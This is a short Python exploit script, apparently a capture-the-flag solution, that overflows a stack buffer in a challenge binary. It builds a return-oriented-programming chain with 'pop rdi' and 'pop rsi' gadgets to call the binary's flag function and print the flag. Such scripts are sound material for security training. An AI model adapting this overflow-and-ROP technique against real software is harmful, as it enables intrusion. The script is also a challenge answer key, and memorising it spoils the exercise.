#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./really_obnoxious_problem")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl1 = b"A" * 72
    pl1 += ptr.p64(next(exe.gadget("pop rdi; ret;")))
    pl1 += ptr.p64(0x1337)
    pl1 += ptr.p64(next(exe.gadget("pop rsi; pop r15; ret;")))
    pl1 += ptr.p64(next(exe.find("bobby")))
    pl1 += ptr.p64(0)
    pl1 += ptr.p64(unwrap(exe.symbol("flag")))

    io.sendlineafter("Name: ", "hello")
    io.sendlineafter("Address: ", pl1)
    io.recvuntil("actf")

    flag = "actf" + io.recvuntil("}").decode()
    print(flag)



if __name__ == "__main__":
    main()
